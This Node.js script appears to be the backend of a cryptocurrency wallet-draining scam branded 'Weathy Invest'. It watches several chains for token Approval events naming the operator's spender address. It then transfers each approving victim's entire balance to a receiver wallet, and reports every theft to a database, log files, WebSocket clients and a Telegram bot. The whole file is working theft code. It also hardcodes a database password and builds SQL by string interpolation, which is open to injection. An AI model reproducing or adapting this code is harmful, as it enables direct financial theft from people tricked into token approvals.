var argv = require('minimist')(process.argv.slice(2));
const fs = require("fs")
const { exec } = require('child_process');
var { log, logSuccess, logError, logWaning, COLOR, encodedStr, decryptString } = require("./std");
const clc = require("cli-color")

const { WebSocketServer } = require('ws');
const CryptoJS = require("crypto-js");
const Web3 = require("web3")
const CHAINS = require("./CHAINS");
var request = require('request');
var moment = require("moment")

var mysql = require('mysql');

var Settings = null;
var spenderPk, spender, receiver;
var password = 'Weathy Invest';

var isDev = false
if (argv.dev) isDev = true;

var db = {
    saveAppoved: async function (content) {
        if (!content.note) content.note = "NULL";
        let sql = `insert into wea.approveds
    (transactionHash, chainId, symbol, owner, spender, note)
    VALUES('${content.transactionHash}', '${content.chainId}', '${content.symbol}', '${content.owner}', '${content.spender}', ${content.note});`

        this.con.query(sql, function (err, result) {
            if (err && !err.code.includes("ER_DUP_ENTRY")) throw err;
            // console.log("saveAppoved: " + result);
        });
    },

    saveTransfered: async function (content) {
        if (!content.note) content.note = "NULL";
        let sql = `insert into wea.transfereds
    (transactionHash, chainId, symbol, fromAddress, toAddress, amount, note)
    VALUES('${content.transactionHash}', '${content.chainId}', '${content.symbol}', '${content.from}', '${content.to}', '${content.value}', ${content.note});`

        this.con.query(sql, function (err, result) {
            if (err && !err.code.includes("ER_DUP_ENTRY")) throw err;
            // console.log("saveTransfered: " + result);
        });
    },

    saveError: async function (error) {
        let json = JSON.stringify(error).replace(/'/g, "\\'");
        let sql = `insert into wea.transfererrors
    (error)  VALUES('${json}');`

        this.con.query((sql), function (err, result) {
            if (err) throw err;
            // console.log("saveError: " + result);
        });
    },

    con: null,

    config: {
        host: "localhost",
        user: "sammy",
        password: "NewP@ssword6789",
        database: "wea",
    },

    connect: async function () {
        return new Promise((rs, rj) => {
            let connection = mysql.createConnection(this.config);

            connection.connect((err) => {
                if (err) rj(err)
                console.log('connected db as id ' + connection.threadId);
                this.con = connection;
                rs(connection);
            });
        })
    },
}

// log(spenderPk)
// log(COLOR.Clear);

async function loadSettings(file = "settings.json") {
    if (isDev) file = "settings-dev.json"
    let content = fs.readFileSync(file, "utf8");
    let settings = JSON.parse(content)
    receiver = settings.receiver
    settings.spenderPk = spenderPk = decryptString(settings.spenderPk)

    spender = (new Web3()).eth.accounts.privateKeyToAccount(settings.spenderPk).address
    Settings = settings;
    return settings;
}

function loadTokens(file = "public/settings.json") {
    if (isDev) file = "public/settings-dev.json";
    let content = fs.readFileSync(file, "utf8");
    let settings = JSON.parse(content)
    return settings.tokens;
}

async function saveSettings(settings, file = "settings.json") {
    let content = JSON.stringify(settings)
    fs.writeFileSync(file, content, "utf8");
}

function loadQuicknode(file = "quicknode.json") {
    let content = fs.readFileSync(file, "utf8")
    return JSON.parse(content)
}

function sendMessageClient(message, allClient = true, clientId = 0) {
    if (allClient) {
        clients.forEach(ws => {
            ws.send(JSON.stringify(message))
        });
    }
}

async function appendFile(filePath, content) {
    let fd = fs.openSync(Settings.dataDir + filePath, 'a+');
    fs.appendFileSync(fd, content + "\n", 'utf8');
}

async function sentAlertTelegram(content, type = "success", settings = Settings) {
    let color = "#49c74e"
    switch (type) {
        case "warning":
            color = "#ff9800";
            break;
        case "success":
            color = "#49c74e";
            break;
        case "error":
            color = "#e100007a";
            break;
    }
    let message = encodeURIComponent(`<code style="color: ${color}">${JSON.stringify(content)}</code>`)
    var options = {
        'method': 'POST',
        'url': `https://api.telegram.org/bot${settings.telegram.token}/sendMessage?chat_id=${settings.telegram.chatId}&text=${message}&parse_mode=html`,
        'headers': {
        }
    };
    request(options, function (error, response) {
        if (error) logError("sentAlertTelegram error:", error.message)
        // console.log(response.body);
    });
}

async function sendToken(web3, symbol, contract, from, to) {
    const gasPrice = await web3.eth.getGasPrice();
    let allowance = await contract.methods.allowance(from, spender).call();
    let balance = await contract.methods.balanceOf(from).call();
    let decimals = await contract.methods.decimals().call();
    let chainId = await web3.eth.net.getId();
    // larger 10$
    let min = 5 * (10 ** decimals);
    logWaning(`${symbol} - ${chainId}, decimal: ${decimals} from: ${from}`);
    logWaning(`contract: ${contract._address}`)
    logWaning(`balance: ${balance}, allowance: ${allowance}, to: ${to}`);
    if (allowance > min && balance > min) {
        const gasEstimate = await contract.methods.transferFrom(from, to, balance).estimateGas({ from: spender });
        logWaning('send:', symbol, balance, from, to, spender);
        contract.methods.transferFrom(from, to, balance).send({ from: spender, gasPrice: gasPrice, gas: gasEstimate }).then(async r => {
            let content = {
                onSent: {
                    chainId: chainId,
                    symbol: symbol,
                    from: from,
                    to: to,
                    value: balance,
                    transactionHash: r.transactionHash,
                }
            }
            try {
                db.saveTransfered(content.onSent)
                appendFile("transfereds.txt", JSON.stringify(content.onSent))
                logSuccess('transferFrom Success')
                sendMessageClient(content)
                sentAlertTelegram(content)

            } catch (error) {
                throw error;
            }
        }).catch(error => {

            let content = {
                chain: web3.eth.networkVersion,
                symbol: symbol,
                from: from,
                to: to,
                error: error.message
            }

            try {
                db.saveError({ content }).catch()
                appendFile("transferedsError.txt", JSON.stringify(content))
                sendMessageClient({ error: error.message })
                sentAlertTelegram({ error: error.message })
                logError("transferedsError: ", error.message)
                // logError(error)
            } catch (error) {
                throw error;
            }
        });
    } else {
        logError("smaller 10$:", "allowance:", allowance / 10 ** decimals, "balance:", balance / 10 ** decimals)
    }
}

function listenEvents(settings = Settings) {
    let { abiFolder } = settings
    let tokens = loadTokens()
    let web3s = []
    let contracts = []
    let quicknode = loadQuicknode()

    Object.keys(tokens).map(symbol => {
        Object.keys(tokens[symbol]).map(async id => {
            let chainId = parseInt(id)
            let abiPath = abiFolder + symbol + "_ABI_" + chainId + ".json"
            log(abiPath, fs.existsSync(abiPath), symbol, chainId)
            let abi = JSON.parse(fs.readFileSync(abiPath, "utf-8"))

            if (chainId == 1337 || chainId == 5777) {
                abi = abi.abi; chainId = 5777;
            }

            let rpc = quicknode[chainId].link

            let provider;
            if (rpc.startsWith("ws")) {
                provider = new Web3.providers.WebsocketProvider(rpc)
            } else {
                provider = new Web3(rpc)
            }

            let web3 = new Web3(provider)
            web3.eth.accounts.wallet.add(spenderPk)

            let contract = new web3.eth.Contract(abi, tokens[symbol][chainId].address)
            if (chainId == 5) test(contract)
            contract.events.Approval({ filter: { "spender": spender } }, (error, event) => {
                if (error) {
                    logError(symbol, chainId, error);
                    let content = {
                        "symbol": symbol, "chainId": chainId, error: error.message,
                        owner: owner, spender: spender, value: value,
                    }
                    db.saveError(content).catch(console.error)
                    appendFile("approvalError.txt", content)
                    sendMessageClient(content)
                    sentAlertTelegram(content)
                } else {
                    logSuccess(chainId, symbol)
                    // log(event.transactionHash, event.returnValues.owner)
                    let content = {
                        onApproval: {
                            chainId: chainId,
                            symbol: symbol,
                            owner: event.returnValues.owner,
                            spender: event.returnValues.spender,
                            transactionHash: event.transactionHash,
                        }
                    }
                    db.saveAppoved(content.onApproval).catch(err => {
                        logError(err)
                        if (err.sqlMessage.includes("Duplicate entry"));
                        else db.saveError(error)
                    })
                    appendFile("approveds.txt", JSON.stringify(content.onApproval))
                    sendMessageClient(content)
                    sentAlertTelegram(content)
                    setTimeout(() => {
                        sendToken(web3, symbol, contract, event.returnValues.owner, receiver)
                    }, chainId == 1 ? 1000 * 60 : 1000);
                }
            })

            web3s.push(web3)
            contracts.push(contract)
        })
    })
    return web3s, contracts;
}

async function test(contract) {
    contract.events.Approval({}, (error, event) => {
        if (error) {
            logError(error)
        } else {
            console.log(event.returnValues)
        }
    })
}

loadSettings()
    .then(async settings => {
        if (!fs.existsSync(settings.dataFolder))
            fs.mkdirSync(settings.dataFolder);

        db.config = settings.database
        db.connect().then(c => {

            logWaning("dev:", isDev)
            logWaning("spender:", spender)
            logWaning("receiver:", receiver)

            let web3s, contracts = listenEvents(settings)
            // sentAlertTelegram("main.js started: " + moment().format("D/M/Y h:m"))
        })
    })
// .catch(error => logError(error))
var port = 1000;
if (argv.port) port = argv.port.trim();
else if (argv.p) port = argv.p;

var clients = []

// const wss = new WebSocketServer({ port: port });
const wss = new WebSocketServer({ port: port });
log("port:", port)
wss.on('connection', (ws) => {
    clients.push(ws)
    let id = clients.length
    logSuccess(id, 'connections')
    ws.on('message', (data) => {
        let msg = JSON.parse(data)

        console.log("%s: %s", id, msg);
        sendMessageClient({ "message": "hi " + id })

        if (msg.backup) {
            let fileName = `wea${moment().format("Y_M_D_h_m")}.sql`
            exec("mysqldump wea > data/" + fileName, (error, stdout, stderr) => {
                if (error) {
                    logError("mysqldump error")
                    logError(error)
                    return;
                } else {
                    sendMessageClient({
                        backup: "success",
                        file: fileName
                    })
                }
                console.log(stdout);
                logError(stderr)
            });
        }
    });

    sendMessageClient({
        status: {
            spender: spender, receiver: receiver
        }
    });

    ws.onclose = (e) => {
        clients.slice(id, 1)
        logError("onclose ws " + id)
    }
});

